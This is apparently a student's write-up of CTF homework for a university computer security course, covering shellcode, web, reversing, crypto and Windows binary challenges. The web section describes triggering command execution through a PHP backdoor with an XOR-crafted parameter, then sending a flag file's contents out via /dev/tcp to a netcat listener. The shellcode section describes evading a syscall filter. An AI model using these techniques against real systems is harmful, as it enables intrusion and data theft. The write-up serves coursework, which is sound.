# Computer Security Hw 0x00 Writeup
* Realname: 胡安鳳
* ID in course web: alfons0329
* Student ID: r08922024

###### tags: `Computer Security` `NTU CS` `CTF` `Writeup`

### Shellc0de(pwn):
In this problem we want to invoke the shell in the remote server yet we are not allowed to pass `\x0f \x05 and \x0f` which is basically the syscall itself.

So we use `shellcraft` with `force` label to avoid such limitation, and if we failed, we may try again until the matched shellcode has been generated

![](https://i.imgur.com/HAArURo.png)

### Backd00r(web):
From the php code in the web, we may see that it allows the query of length 4 (GET) `$x=(substr($_GET[87],0,4)^"d00r");`, so send the data with "exec ^ door" to query `\?87\=%01HU%11` and finally use post with `ls ~/` to acquire the data location first
![](https://i.imgur.com/q0EsRht.png)

Then finally send the data after `cat ~/flag_is_here` command has been sent, redirected to the `/dev/tcp` of my PC and use `nc -l <port>` to receive data
![](https://i.imgur.com/BmAQhad.png)
![](https://i.imgur.com/sfc9Qnk.png)

### m4chine(reverse):
Comment out the assert code after decompiling the pyc file to make it easier for debugging and tracing.
Trace the code step by step and we can find the only flag.
For example, we have already known that the flag is in the form of `FLAG{*}`
![](https://i.imgur.com/1sV3hbg.png)
We add arr[-1] (8) with arr[-2] 125 - (66 which is B) then compare it with 100. -> which implies we need  ` 125 - something + 8 == 100, that is 125 - 92 = 33` and in ASCII '!' is (33)_10
Hence we have FLAG{!} now and infer again
![](https://i.imgur.com/4Kryby8.png)
This time we want `something + 1 == 52, that is 52 - 1 = 51` and in ASCII '3' is (51)_110
Hence we have FLAG{3!} now

By keep doing this, we will get the final flag.
![](https://i.imgur.com/xdJvk5y.png)


### Encrypt(crypto):
The only part that make data changed is op3 and op4, we just need to reverse op3 and op4 to acquire the flag.

Op3 uses the value of p in location i to rearrange data m, then we iterate through `0 to len(m)`` again with `m[p.index(i)]` to transform the data back, ex:
```
m[5 6 7 8]
p[3 1 2 0]
after op3 --> m became [8 6 7 5]
so iterate i in [0, 3] will get
recovered += p.index(0) --> recovered += 5
recovered += p.index(1) --> recovered += 6
recovered += p.index(2) --> recovered += 7
recovered += p.index(3) --> recovered += 8
```

Op4 uses the byte value in m to rearrange data s, similar approach as above

```
m[3 1 2 0]
s[2 1 3 0]
after op4 --> s became [0 1 3 2]
so iterate i in [0, 3] will get
recovered += s.index(m[0]) ---> recovered += 2
recovered += s.index(m[1]) ---> recovered += 1
recovered += s.index(m[2]) ---> recovered += 3
recovered += s.index(m[3]) ---> recovered += 0
```

![](https://i.imgur.com/UMHlj6X.png)

### Winmagic(misc):
We can see the cipher from IDA Pro after the `char key[] = "Do_you_know.....????"` string
![](https://i.imgur.com/7JRREDG.png)
And XOR key with cipher, we will get the answer
![](https://i.imgur.com/ppGppGF.png)
